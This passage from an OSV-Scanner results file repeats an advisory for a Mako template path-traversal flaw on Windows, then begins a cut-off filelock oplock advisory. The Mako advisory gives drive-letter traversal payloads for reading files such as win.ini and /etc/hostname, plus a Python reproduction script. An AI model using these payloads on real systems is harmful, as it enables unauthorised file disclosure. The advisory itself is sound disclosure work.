              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-102991](https://osv.dev/CVE-2026-102991)**\n(Also published as: [PYSEC-2026-4243](https://osv.dev/PYSEC-2026-4243), [GHSA-5639-2j2p-m4mx](https://osv.dev/GHSA-5639-2j2p-m4mx), ).\n\n## [PYSEC-2026-4243](https://osv.dev/PYSEC-2026-4243)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e On Windows, a `TemplateLookup` URI beginning with a drive designator (e.g. `C:/../../secret.txt` or `C:\\..\\..\\secret.txt`) bypasses the directory traversal check in `Template.__init__`, allowing reads of files outside the configured template directory.\n\u003e \n\u003e This is a third, independent instance of the root cause behind CVE-2026-41205 (the `//` prefix) and CVE-2026-44307 (the backslash form). Both of those fixes normalized a separator *spelling*. Neither addressed the other way `posixpath` and `ntpath` disagree: the drive designator. Both prior fixes remain effective on their own terms; this variant survives them for an independent reason.\n\u003e \n\u003e ## Details\n\u003e \n\u003e The root cause is the same `posixpath` / `os.path` mismatch: resolution is done with `posixpath`, confinement is checked with `os.path`, which is `ntpath` on Windows.\n\u003e \n\u003e ```\n\u003e # mako/lookup.py -- resolution\n\u003e 247:  srcfile = posixpath.normpath(posixpath.join(dir_, u))   # posixpath, always\n\u003e 248:  if os.path.isfile(srcfile):                             # ntpath on Windows\n\u003e \n\u003e # mako/template.py -- confinement\n\u003e 268:  u_norm = os.path.normpath(u_norm)                       # ntpath on Windows\n\u003e 269:  if u_norm.startswith(\"..\"):                             # never true for a drive URI\n\u003e ```\n\u003e \n\u003e `posixpath` has no concept of a drive, so it treats `C:` as an ordinary path component; the `..` segments pop `C:` and then escape the template root. `ntpath`, by contrast, splits the drive off and treats the remainder as rooted, discarding the `..` entirely -- so the guard on line 269 inspects a string from which the evidence has already been removed:\n\u003e \n\u003e | URI | `ntpath.normpath` (what the guard sees) | guard fires |\n\u003e |---|---|---|\n\u003e | `//../secret.txt` | `..\\secret.txt` | yes |\n\u003e | `\\..\\secret.txt` | `..\\secret.txt` | yes |\n\u003e | `C:/../../secret.txt` | `C:\\secret.txt` | **no** |\n\u003e \n\u003e Because the guard cannot fire for *any* URI beginning with a single-letter drive designator, the traversal is unconstrained, and its depth does not have to be guessed. `posixpath.normpath()` saturates excess `..` segments at the root rather than erroring, so a URI carrying more `..` than the template root is deep reaches the volume root and descends from there. A single fixed payload therefore works regardless of where the template directory sits:\n\u003e \n\u003e ```\n\u003e template root = \u003cbase\u003e/srv/app/templates\n\u003e \n\u003e 'C:/../../../../boot.ini'          -\u003e reads \u003cbase\u003e/boot.ini\n\u003e 'C:/' + '../'*40 + 'etc/hostname'  -\u003e reads /etc/hostname   (no depth guess)\n\u003e 'C:/../../../../../etc/hostname'   -\u003e TopLevelLookupException (wrong depth)\n\u003e ```\n\u003e \n\u003e On Windows the equivalent is `C:/../../../../../../../../Windows/win.ini`, which reads that file for any template root depth. Only a target addressed *relative* to the template root needs the `..` count to be exact; anything reachable from the volume root does not.\n\u003e \n\u003e ### Affected code\n\u003e \n\u003e - `mako/template.py`: `Template.__init__()` URI validation uses `os.path.normpath()`, which on Windows strips the drive and discards the `..` segments before the `startswith(\"..\")` guard is applied.\n\u003e - `mako/lookup.py`: `TemplateLookup.get_template()` resolves with `posixpath.normpath`/`posixpath.join`, where `C:` is an ordinary component, then performs the existence check with `os.path.isfile()`.\n\u003e \n\u003e ### Reproduction\n\u003e \n\u003e Windows is emulated with the technique already used by the project's own test suite (`test/test_template.py:1398-1401`):\n\u003e \n\u003e ```python\n\u003e import os, ntpath\n\u003e os.path = ntpath\n\u003e \n\u003e from mako.lookup import TemplateLookup\n\u003e lookup = TemplateLookup(directories=[\"root/tpl\"])\n\u003e \n\u003e for uri in [\"ok.html\",\n\u003e             \"//../../secret.txt\",\n\u003e             \"\\\\..\\\\..\\\\secret.txt\",\n\u003e             \"../../secret.txt\",\n\u003e             \"C:/../../../secret.txt\",\n\u003e             \"C:\\\\..\\\\..\\\\..\\\\secret.txt\",\n\u003e             \"d:/../../../secret.txt\"]:\n\u003e     try:\n\u003e         t = lookup.get_template(uri)\n\u003e         print(repr(uri), \"-\u003e filename=\", t.filename, repr(t.render()))\n\u003e     except Exception as e:\n\u003e         print(repr(uri), \"-\u003e REFUSED\", type(e).__name__)\n\u003e ```\n\u003e \n\u003e Against 1.4.1, with a sentinel file written outside the configured directory:\n\u003e \n\u003e ```\n\u003e 'ok.html'                    -\u003e root/tpl/ok.html        'OK'         (positive control)\n\u003e '//../../secret.txt'         -\u003e REFUSED   (CVE-2026-41205 fix works)\n\u003e '\\..\\..\\secret.txt'          -\u003e REFUSED   (CVE-2026-44307 fix works)\n\u003e '../../secret.txt'           -\u003e REFUSED\n\u003e 'C:/../../../secret.txt'     -\u003e reads the sentinel\n\u003e 'C:\\..\\..\\..\\secret.txt'     -\u003e reads the sentinel\n\u003e 'd:/../../../secret.txt'     -\u003e reads the sentinel\n\u003e ```\n\u003e \n\u003e On POSIX the same URIs are refused, because `posixpath.normpath` keeps `C:` as an ordinary component and the `..` survive to be inspected. The issue is Windows-only.\n\u003e \n\u003e Note that `d:/../../../secret.txt` resolves relative to the template root, not to drive `D:` -- this is not a cross-drive read. Reaching another drive would require a leading `..`, which `ntpath.normpath` renders as `..\\..\\D:\\x` and the existing guard catches.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e If an application on Windows passes user-controlled template names or include paths to `TemplateLookup.get_template()`, an attacker may load and disclose any file readable by the application process on the same volume as the template directory, not merely files adjacent to it. The primary impact is local file disclosure. If the targeted file contains Mako/Python template syntax, it may also be parsed and executed as a template.\n\u003e \n\u003e As with CVE-2026-41205, the URI is not generally reachable through a raw URL path, since a conforming URL normalizer collapses `C:/../..` first. The relevant vectors are query strings, form and JSON bodies, route parameters, and `\u003c%include file=\"${...}\"/\u003e`.\n\u003e \n\u003e ## Remediation\n\u003e \n\u003e Normalize both sides with the same module. The resolution side already commits to `posixpath`, so the confinement check should as well:\n\u003e \n\u003e ```python\n\u003e u_norm = posixpath.normpath(self.uri.replace(\"\\\\\", \"/\").lstrip(\"/\"))\n\u003e if u_norm.startswith(\"..\"):\n\u003e     raise exceptions.TemplateLookupException(...)\n\u003e ```\n\u003e \n\u003e This closes the drive case for the same reason it closes `//`: `posixpath` treats `C:` as an ordinary component, so the `..` segments survive to be inspected. Verified to block all three drive forms with the full test suite passing.\n\u003e \n\u003e ## Credit\n\u003e \n\u003e Reported by Eurico Nicacio under coordinated disclosure.\n\n\u003c/details\u003e\n\n## [GHSA-5639-2j2p-m4mx](https://osv.dev/GHSA-5639-2j2p-m4mx)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e On Windows, a `TemplateLookup` URI beginning with a drive designator (e.g. `C:/../../secret.txt` or `C:\\..\\..\\secret.txt`) bypasses the directory traversal check in `Template.__init__`, allowing reads of files outside the configured template directory.\n\u003e \n\u003e This is a third, independent instance of the root cause behind CVE-2026-41205 (the `//` prefix) and CVE-2026-44307 (the backslash form). Both of those fixes normalized a separator *spelling*. Neither addressed the other way `posixpath` and `ntpath` disagree: the drive designator. Both prior fixes remain effective on their own terms; this variant survives them for an independent reason.\n\u003e \n\u003e ## Details\n\u003e \n\u003e The root cause is the same `posixpath` / `os.path` mismatch: resolution is done with `posixpath`, confinement is checked with `os.path`, which is `ntpath` on Windows.\n\u003e \n\u003e ```\n\u003e # mako/lookup.py -- resolution\n\u003e 247:  srcfile = posixpath.normpath(posixpath.join(dir_, u))   # posixpath, always\n\u003e 248:  if os.path.isfile(srcfile):                             # ntpath on Windows\n\u003e \n\u003e # mako/template.py -- confinement\n\u003e 268:  u_norm = os.path.normpath(u_norm)                       # ntpath on Windows\n\u003e 269:  if u_norm.startswith(\"..\"):                             # never true for a drive URI\n\u003e ```\n\u003e \n\u003e `posixpath` has no concept of a drive, so it treats `C:` as an ordinary path component; the `..` segments pop `C:` and then escape the template root. `ntpath`, by contrast, splits the drive off and treats the remainder as rooted, discarding the `..` entirely -- so the guard on line 269 inspects a string from which the evidence has already been removed:\n\u003e \n\u003e | URI | `ntpath.normpath` (what the guard sees) | guard fires |\n\u003e |---|---|---|\n\u003e | `//../secret.txt` | `..\\secret.txt` | yes |\n\u003e | `\\..\\secret.txt` | `..\\secret.txt` | yes |\n\u003e | `C:/../../secret.txt` | `C:\\secret.txt` | **no** |\n\u003e \n\u003e Because the guard cannot fire for *any* URI beginning with a single-letter drive designator, the traversal is unconstrained, and its depth does not have to be guessed. `posixpath.normpath()` saturates excess `..` segments at the root rather than erroring, so a URI carrying more `..` than the template root is deep reaches the volume root and descends from there. A single fixed payload therefore works regardless of where the template directory sits:\n\u003e \n\u003e ```\n\u003e template root = \u003cbase\u003e/srv/app/templates\n\u003e \n\u003e 'C:/../../../../boot.ini'          -\u003e reads \u003cbase\u003e/boot.ini\n\u003e 'C:/' + '../'*40 + 'etc/hostname'  -\u003e reads /etc/hostname   (no depth guess)\n\u003e 'C:/../../../../../etc/hostname'   -\u003e TopLevelLookupException (wrong depth)\n\u003e ```\n\u003e \n\u003e On Windows the equivalent is `C:/../../../../../../../../Windows/win.ini`, which reads that file for any template root depth. Only a target addressed *relative* to the template root needs the `..` count to be exact; anything reachable from the volume root does not.\n\u003e \n\u003e ### Affected code\n\u003e \n\u003e - `mako/template.py`: `Template.__init__()` URI validation uses `os.path.normpath()`, which on Windows strips the drive and discards the `..` segments before the `startswith(\"..\")` guard is applied.\n\u003e - `mako/lookup.py`: `TemplateLookup.get_template()` resolves with `posixpath.normpath`/`posixpath.join`, where `C:` is an ordinary component, then performs the existence check with `os.path.isfile()`.\n\u003e \n\u003e ### Reproduction\n\u003e \n\u003e Windows is emulated with the technique already used by the project's own test suite (`test/test_template.py:1398-1401`):\n\u003e \n\u003e ```python\n\u003e import os, ntpath\n\u003e os.path = ntpath\n\u003e \n\u003e from mako.lookup import TemplateLookup\n\u003e lookup = TemplateLookup(directories=[\"root/tpl\"])\n\u003e \n\u003e for uri in [\"ok.html\",\n\u003e             \"//../../secret.txt\",\n\u003e             \"\\\\..\\\\..\\\\secret.txt\",\n\u003e             \"../../secret.txt\",\n\u003e             \"C:/../../../secret.txt\",\n\u003e             \"C:\\\\..\\\\..\\\\..\\\\secret.txt\",\n\u003e             \"d:/../../../secret.txt\"]:\n\u003e     try:\n\u003e         t = lookup.get_template(uri)\n\u003e         print(repr(uri), \"-\u003e filename=\", t.filename, repr(t.render()))\n\u003e     except Exception as e:\n\u003e         print(repr(uri), \"-\u003e REFUSED\", type(e).__name__)\n\u003e ```\n\u003e \n\u003e Against 1.4.1, with a sentinel file written outside the configured directory:\n\u003e \n\u003e ```\n\u003e 'ok.html'                    -\u003e root/tpl/ok.html        'OK'         (positive control)\n\u003e '//../../secret.txt'         -\u003e REFUSED   (CVE-2026-41205 fix works)\n\u003e '\\..\\..\\secret.txt'          -\u003e REFUSED   (CVE-2026-44307 fix works)\n\u003e '../../secret.txt'           -\u003e REFUSED\n\u003e 'C:/../../../secret.txt'     -\u003e reads the sentinel\n\u003e 'C:\\..\\..\\..\\secret.txt'     -\u003e reads the sentinel\n\u003e 'd:/../../../secret.txt'     -\u003e reads the sentinel\n\u003e ```\n\u003e \n\u003e On POSIX the same URIs are refused, because `posixpath.normpath` keeps `C:` as an ordinary component and the `..` survive to be inspected. The issue is Windows-only.\n\u003e \n\u003e Note that `d:/../../../secret.txt` resolves relative to the template root, not to drive `D:` -- this is not a cross-drive read. Reaching another drive would require a leading `..`, which `ntpath.normpath` renders as `..\\..\\D:\\x` and the existing guard catches.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e If an application on Windows passes user-controlled template names or include paths to `TemplateLookup.get_template()`, an attacker may load and disclose any file readable by the application process on the same volume as the template directory, not merely files adjacent to it. The primary impact is local file disclosure. If the targeted file contains Mako/Python template syntax, it may also be parsed and executed as a template.\n\u003e \n\u003e As with CVE-2026-41205, the URI is not generally reachable through a raw URL path, since a conforming URL normalizer collapses `C:/../..` first. The relevant vectors are query strings, form and JSON bodies, route parameters, and `\u003c%include file=\"${...}\"/\u003e`.\n\u003e \n\u003e ## Remediation\n\u003e \n\u003e Normalize both sides with the same module. The resolution side already commits to `posixpath`, so the confinement check should as well:\n\u003e \n\u003e ```python\n\u003e u_norm = posixpath.normpath(self.uri.replace(\"\\\\\", \"/\").lstrip(\"/\"))\n\u003e if u_norm.startswith(\"..\"):\n\u003e     raise exceptions.TemplateLookupException(...)\n\u003e ```\n\u003e \n\u003e This closes the drive case for the same reason it closes `//`: `posixpath` treats `C:` as an ordinary component, so the `..` segments survive to be inspected. Verified to block all three drive forms with the full test suite passing.\n\u003e \n\u003e ## Credit\n\u003e \n\u003e Reported by Eurico Nicacio under coordinated disclosure.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | mako | 1.3.10 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-5639-2j2p-m4mx | mako | 1.4.2 |\n| PYSEC-2026-4243 | mako | 1.4.2 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-102991\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-102991](https://osv.dev/CVE-2026-102991)**\n(Also published as: [PYSEC-2026-4243](https://osv.dev/PYSEC-2026-4243), [GHSA-5639-2j2p-m4mx](https://osv.dev/GHSA-5639-2j2p-m4mx), ).\n\n## [PYSEC-2026-4243](https://osv.dev/PYSEC-2026-4243)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e On Windows, a `TemplateLookup` URI beginning with a drive designator (e.g. `C:/../../secret.txt` or `C:\\..\\..\\secret.txt`) bypasses the directory traversal check in `Template.__init__`, allowing reads of files outside the configured template directory.\n\u003e \n\u003e This is a third, independent instance of the root cause behind CVE-2026-41205 (the `//` prefix) and CVE-2026-44307 (the backslash form). Both of those fixes normalized a separator *spelling*. Neither addressed the other way `posixpath` and `ntpath` disagree: the drive designator. Both prior fixes remain effective on their own terms; this variant survives them for an independent reason.\n\u003e \n\u003e ## Details\n\u003e \n\u003e The root cause is the same `posixpath` / `os.path` mismatch: resolution is done with `posixpath`, confinement is checked with `os.path`, which is `ntpath` on Windows.\n\u003e \n\u003e ```\n\u003e # mako/lookup.py -- resolution\n\u003e 247:  srcfile = posixpath.normpath(posixpath.join(dir_, u))   # posixpath, always\n\u003e 248:  if os.path.isfile(srcfile):                             # ntpath on Windows\n\u003e \n\u003e # mako/template.py -- confinement\n\u003e 268:  u_norm = os.path.normpath(u_norm)                       # ntpath on Windows\n\u003e 269:  if u_norm.startswith(\"..\"):                             # never true for a drive URI\n\u003e ```\n\u003e \n\u003e `posixpath` has no concept of a drive, so it treats `C:` as an ordinary path component; the `..` segments pop `C:` and then escape the template root. `ntpath`, by contrast, splits the drive off and treats the remainder as rooted, discarding the `..` entirely -- so the guard on line 269 inspects a string from which the evidence has already been removed:\n\u003e \n\u003e | URI | `ntpath.normpath` (what the guard sees) | guard fires |\n\u003e |---|---|---|\n\u003e | `//../secret.txt` | `..\\secret.txt` | yes |\n\u003e | `\\..\\secret.txt` | `..\\secret.txt` | yes |\n\u003e | `C:/../../secret.txt` | `C:\\secret.txt` | **no** |\n\u003e \n\u003e Because the guard cannot fire for *any* URI beginning with a single-letter drive designator, the traversal is unconstrained, and its depth does not have to be guessed. `posixpath.normpath()` saturates excess `..` segments at the root rather than erroring, so a URI carrying more `..` than the template root is deep reaches the volume root and descends from there. A single fixed payload therefore works regardless of where the template directory sits:\n\u003e \n\u003e ```\n\u003e template root = \u003cbase\u003e/srv/app/templates\n\u003e \n\u003e 'C:/../../../../boot.ini'          -\u003e reads \u003cbase\u003e/boot.ini\n\u003e 'C:/' + '../'*40 + 'etc/hostname'  -\u003e reads /etc/hostname   (no depth guess)\n\u003e 'C:/../../../../../etc/hostname'   -\u003e TopLevelLookupException (wrong depth)\n\u003e ```\n\u003e \n\u003e On Windows the equivalent is `C:/../../../../../../../../Windows/win.ini`, which reads that file for any template root depth. Only a target addressed *relative* to the template root needs the `..` count to be exact; anything reachable from the volume root does not.\n\u003e \n\u003e ### Affected code\n\u003e \n\u003e - `mako/template.py`: `Template.__init__()` URI validation uses `os.path.normpath()`, which on Windows strips the drive and discards the `..` segments before the `startswith(\"..\")` guard is applied.\n\u003e - `mako/lookup.py`: `TemplateLookup.get_template()` resolves with `posixpath.normpath`/`posixpath.join`, where `C:` is an ordinary component, then performs the existence check with `os.path.isfile()`.\n\u003e \n\u003e ### Reproduction\n\u003e \n\u003e Windows is emulated with the technique already used by the project's own test suite (`test/test_template.py:1398-1401`):\n\u003e \n\u003e ```python\n\u003e import os, ntpath\n\u003e os.path = ntpath\n\u003e \n\u003e from mako.lookup import TemplateLookup\n\u003e lookup = TemplateLookup(directories=[\"root/tpl\"])\n\u003e \n\u003e for uri in [\"ok.html\",\n\u003e             \"//../../secret.txt\",\n\u003e             \"\\\\..\\\\..\\\\secret.txt\",\n\u003e             \"../../secret.txt\",\n\u003e             \"C:/../../../secret.txt\",\n\u003e             \"C:\\\\..\\\\..\\\\..\\\\secret.txt\",\n\u003e             \"d:/../../../secret.txt\"]:\n\u003e     try:\n\u003e         t = lookup.get_template(uri)\n\u003e         print(repr(uri), \"-\u003e filename=\", t.filename, repr(t.render()))\n\u003e     except Exception as e:\n\u003e         print(repr(uri), \"-\u003e REFUSED\", type(e).__name__)\n\u003e ```\n\u003e \n\u003e Against 1.4.1, with a sentinel file written outside the configured directory:\n\u003e \n\u003e ```\n\u003e 'ok.html'                    -\u003e root/tpl/ok.html        'OK'         (positive control)\n\u003e '//../../secret.txt'         -\u003e REFUSED   (CVE-2026-41205 fix works)\n\u003e '\\..\\..\\secret.txt'          -\u003e REFUSED   (CVE-2026-44307 fix works)\n\u003e '../../secret.txt'           -\u003e REFUSED\n\u003e 'C:/../../../secret.txt'     -\u003e reads the sentinel\n\u003e 'C:\\..\\..\\..\\secret.txt'     -\u003e reads the sentinel\n\u003e 'd:/../../../secret.txt'     -\u003e reads the sentinel\n\u003e ```\n\u003e \n\u003e On POSIX the same URIs are refused, because `posixpath.normpath` keeps `C:` as an ordinary component and the `..` survive to be inspected. The issue is Windows-only.\n\u003e \n\u003e Note that `d:/../../../secret.txt` resolves relative to the template root, not to drive `D:` -- this is not a cross-drive read. Reaching another drive would require a leading `..`, which `ntpath.normpath` renders as `..\\..\\D:\\x` and the existing guard catches.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e If an application on Windows passes user-controlled template names or include paths to `TemplateLookup.get_template()`, an attacker may load and disclose any file readable by the application process on the same volume as the template directory, not merely files adjacent to it. The primary impact is local file disclosure. If the targeted file contains Mako/Python template syntax, it may also be parsed and executed as a template.\n\u003e \n\u003e As with CVE-2026-41205, the URI is not generally reachable through a raw URL path, since a conforming URL normalizer collapses `C:/../..` first. The relevant vectors are query strings, form and JSON bodies, route parameters, and `\u003c%include file=\"${...}\"/\u003e`.\n\u003e \n\u003e ## Remediation\n\u003e \n\u003e Normalize both sides with the same module. The resolution side already commits to `posixpath`, so the confinement check should as well:\n\u003e \n\u003e ```python\n\u003e u_norm = posixpath.normpath(self.uri.replace(\"\\\\\", \"/\").lstrip(\"/\"))\n\u003e if u_norm.startswith(\"..\"):\n\u003e     raise exceptions.TemplateLookupException(...)\n\u003e ```\n\u003e \n\u003e This closes the drive case for the same reason it closes `//`: `posixpath` treats `C:` as an ordinary component, so the `..` segments survive to be inspected. Verified to block all three drive forms with the full test suite passing.\n\u003e \n\u003e ## Credit\n\u003e \n\u003e Reported by Eurico Nicacio under coordinated disclosure.\n\n\u003c/details\u003e\n\n## [GHSA-5639-2j2p-m4mx](https://osv.dev/GHSA-5639-2j2p-m4mx)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e On Windows, a `TemplateLookup` URI beginning with a drive designator (e.g. `C:/../../secret.txt` or `C:\\..\\..\\secret.txt`) bypasses the directory traversal check in `Template.__init__`, allowing reads of files outside the configured template directory.\n\u003e \n\u003e This is a third, independent instance of the root cause behind CVE-2026-41205 (the `//` prefix) and CVE-2026-44307 (the backslash form). Both of those fixes normalized a separator *spelling*. Neither addressed the other way `posixpath` and `ntpath` disagree: the drive designator. Both prior fixes remain effective on their own terms; this variant survives them for an independent reason.\n\u003e \n\u003e ## Details\n\u003e \n\u003e The root cause is the same `posixpath` / `os.path` mismatch: resolution is done with `posixpath`, confinement is checked with `os.path`, which is `ntpath` on Windows.\n\u003e \n\u003e ```\n\u003e # mako/lookup.py -- resolution\n\u003e 247:  srcfile = posixpath.normpath(posixpath.join(dir_, u))   # posixpath, always\n\u003e 248:  if os.path.isfile(srcfile):                             # ntpath on Windows\n\u003e \n\u003e # mako/template.py -- confinement\n\u003e 268:  u_norm = os.path.normpath(u_norm)                       # ntpath on Windows\n\u003e 269:  if u_norm.startswith(\"..\"):                             # never true for a drive URI\n\u003e ```\n\u003e \n\u003e `posixpath` has no concept of a drive, so it treats `C:` as an ordinary path component; the `..` segments pop `C:` and then escape the template root. `ntpath`, by contrast, splits the drive off and treats the remainder as rooted, discarding the `..` entirely -- so the guard on line 269 inspects a string from which the evidence has already been removed:\n\u003e \n\u003e | URI | `ntpath.normpath` (what the guard sees) | guard fires |\n\u003e |---|---|---|\n\u003e | `//../secret.txt` | `..\\secret.txt` | yes |\n\u003e | `\\..\\secret.txt` | `..\\secret.txt` | yes |\n\u003e | `C:/../../secret.txt` | `C:\\secret.txt` | **no** |\n\u003e \n\u003e Because the guard cannot fire for *any* URI beginning with a single-letter drive designator, the traversal is unconstrained, and its depth does not have to be guessed. `posixpath.normpath()` saturates excess `..` segments at the root rather than erroring, so a URI carrying more `..` than the template root is deep reaches the volume root and descends from there. A single fixed payload therefore works regardless of where the template directory sits:\n\u003e \n\u003e ```\n\u003e template root = \u003cbase\u003e/srv/app/templates\n\u003e \n\u003e 'C:/../../../../boot.ini'          -\u003e reads \u003cbase\u003e/boot.ini\n\u003e 'C:/' + '../'*40 + 'etc/hostname'  -\u003e reads /etc/hostname   (no depth guess)\n\u003e 'C:/../../../../../etc/hostname'   -\u003e TopLevelLookupException (wrong depth)\n\u003e ```\n\u003e \n\u003e On Windows the equivalent is `C:/../../../../../../../../Windows/win.ini`, which reads that file for any template root depth. Only a target addressed *relative* to the template root needs the `..` count to be exact; anything reachable from the volume root does not.\n\u003e \n\u003e ### Affected code\n\u003e \n\u003e - `mako/template.py`: `Template.__init__()` URI validation uses `os.path.normpath()`, which on Windows strips the drive and discards the `..` segments before the `startswith(\"..\")` guard is applied.\n\u003e - `mako/lookup.py`: `TemplateLookup.get_template()` resolves with `posixpath.normpath`/`posixpath.join`, where `C:` is an ordinary component, then performs the existence check with `os.path.isfile()`.\n\u003e \n\u003e ### Reproduction\n\u003e \n\u003e Windows is emulated with the technique already used by the project's own test suite (`test/test_template.py:1398-1401`):\n\u003e \n\u003e ```python\n\u003e import os, ntpath\n\u003e os.path = ntpath\n\u003e \n\u003e from mako.lookup import TemplateLookup\n\u003e lookup = TemplateLookup(directories=[\"root/tpl\"])\n\u003e \n\u003e for uri in [\"ok.html\",\n\u003e             \"//../../secret.txt\",\n\u003e             \"\\\\..\\\\..\\\\secret.txt\",\n\u003e             \"../../secret.txt\",\n\u003e             \"C:/../../../secret.txt\",\n\u003e             \"C:\\\\..\\\\..\\\\..\\\\secret.txt\",\n\u003e             \"d:/../../../secret.txt\"]:\n\u003e     try:\n\u003e         t = lookup.get_template(uri)\n\u003e         print(repr(uri), \"-\u003e filename=\", t.filename, repr(t.render()))\n\u003e     except Exception as e:\n\u003e         print(repr(uri), \"-\u003e REFUSED\", type(e).__name__)\n\u003e ```\n\u003e \n\u003e Against 1.4.1, with a sentinel file written outside the configured directory:\n\u003e \n\u003e ```\n\u003e 'ok.html'                    -\u003e root/tpl/ok.html        'OK'         (positive control)\n\u003e '//../../secret.txt'         -\u003e REFUSED   (CVE-2026-41205 fix works)\n\u003e '\\..\\..\\secret.txt'          -\u003e REFUSED   (CVE-2026-44307 fix works)\n\u003e '../../secret.txt'           -\u003e REFUSED\n\u003e 'C:/../../../secret.txt'     -\u003e reads the sentinel\n\u003e 'C:\\..\\..\\..\\secret.txt'     -\u003e reads the sentinel\n\u003e 'd:/../../../secret.txt'     -\u003e reads the sentinel\n\u003e ```\n\u003e \n\u003e On POSIX the same URIs are refused, because `posixpath.normpath` keeps `C:` as an ordinary component and the `..` survive to be inspected. The issue is Windows-only.\n\u003e \n\u003e Note that `d:/../../../secret.txt` resolves relative to the template root, not to drive `D:` -- this is not a cross-drive read. Reaching another drive would require a leading `..`, which `ntpath.normpath` renders as `..\\..\\D:\\x` and the existing guard catches.\n\u003e \n\u003e ## Impact\n\u003e \n\u003e If an application on Windows passes user-controlled template names or include paths to `TemplateLookup.get_template()`, an attacker may load and disclose any file readable by the application process on the same volume as the template directory, not merely files adjacent to it. The primary impact is local file disclosure. If the targeted file contains Mako/Python template syntax, it may also be parsed and executed as a template.\n\u003e \n\u003e As with CVE-2026-41205, the URI is not generally reachable through a raw URL path, since a conforming URL normalizer collapses `C:/../..` first. The relevant vectors are query strings, form and JSON bodies, route parameters, and `\u003c%include file=\"${...}\"/\u003e`.\n\u003e \n\u003e ## Remediation\n\u003e \n\u003e Normalize both sides with the same module. The resolution side already commits to `posixpath`, so the confinement check should as well:\n\u003e \n\u003e ```python\n\u003e u_norm = posixpath.normpath(self.uri.replace(\"\\\\\", \"/\").lstrip(\"/\"))\n\u003e if u_norm.startswith(\"..\"):\n\u003e     raise exceptions.TemplateLookupException(...)\n\u003e ```\n\u003e \n\u003e This closes the drive case for the same reason it closes `//`: `posixpath` treats `C:` as an ordinary component, so the `..` segments survive to be inspected. Verified to block all three drive forms with the full test suite passing.\n\u003e \n\u003e ## Credit\n\u003e \n\u003e Reported by Eurico Nicacio under coordinated disclosure.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/poetry.lock | mako | 1.3.10 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-5639-2j2p-m4mx | mako | 1.4.2 |\n| PYSEC-2026-4243 | mako | 1.4.2 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/.staging/devenvironment/containers/services/api/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-102991\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-102991",
              "name": "CVE-2026-102991",
              "properties": {
                "security-severity": "6.5"
              },
              "relationships": [],
              "shortDescription": {
                "markdown": "CVE-2026-102991: Mako: Path traversal via drive-letter URI on Windows in TemplateLookup",
                "text": "CVE-2026-102991: Mako: Path traversal via drive-letter URI on Windows in TemplateLookup"
              }
            },
            {
              "deprecatedIds": [
                "CVE-2026-112907",
                "GHSA-567q-5qvw-pf92"
              ],
              "fullDescription": {
                "markdown": "On Windows the soft locks (`SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, their async forms, and a `FileLock` that fell back to a soft lock) read their marker by path. The marker is the lock file whose presence says a process holds the lock. Each `acquire()` attempt that finds a marker opens it with `os.open` to read the holder's process id, and the lock renames and deletes a marker it judges stale, by path. On Windows each of these calls waits for an oplock. An oplock (opportunistic lock) is a request by a process that holds a handle on a file to be told before another process opens, renames or deletes that file; the other process waits until the holder answers the break or closes its handle.\n\nAnother local account that can open the marker for reading can take a Level 1 oplock on it while no process holds it open, and leave the break unanswered. Every `acquire()` by the user running the lock (below: the lock user) then waits inside the open, past its `timeout`, `blocking=False` and `cancel_check`, and a stale marker under that oplock is not broken. Mutual exclusion holds and the lock touches no other file. Affected versions are filelock 3.22.0 through 4.2.0 on Windows. The maintainers found this while reviewing the fix for the report Anthropic's OSS Scanner sent on 15 October 2026 (review round 4, finding F4); it is not among the scanner's findings.\n\n## Severity\n\n**CVSS 3.1 `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L` scores 2.5 (Low).**\n\n`AV:L` (local): the other account needs a logon on the same host. `AC:H` (high attack complexity): Windows grants a Level 1 or batch oplock only to the sole open handle on a file, so the marker must have no holder handle when the other account asks. That account cannot bring this about; it waits for a holder that died, closed its descriptor, or left a marker past its `lifetime`. `PR:L` (low privileges): an ordinary account with read access to the marker through the directory's inherited ACL (access control 